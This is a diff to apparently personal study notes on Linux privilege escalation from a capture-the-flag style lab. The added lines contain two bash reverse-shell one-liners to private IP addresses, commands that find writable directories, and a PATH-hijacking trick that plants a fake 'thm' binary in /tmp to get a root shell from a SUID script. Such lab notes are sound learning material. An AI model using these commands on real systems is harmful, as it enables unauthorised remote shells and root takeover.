@@ -124,3 +124,35 @@ use gtfobins
 
 /etc/crontab
 
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+or
+bash -c 'exec bash -i &>/dev/tcp/192.168.45.164/1234 <&1'
+
+
+echo $PATH
+
+if we have a path that looks like this 
+
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+if we type thm in the comman like this are the folders/locations linux will look in for the exucutable called thm
+
+if there is a script that has the SUID bit and launch a system binary called 'thm' 
+we could create a binary named thm in a writable folder under PATH if none is writable we add one (/tmp) path” script run it. As the SUID bit it will be run as the root privilege
+
+find / -writable 2>/dev/null | grep usr |cut -d "/" -f 2,3 | sort -u
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+export PATH=/tmp:$PATH
+echo $PATH
+
+now the path script will also look under the /tmp folder for an executable named “thm”. 
+
+cd /tmp
+echo "/bin/bash" > thm
+chmod 777 thm
+ls -la
+
+./run the script 
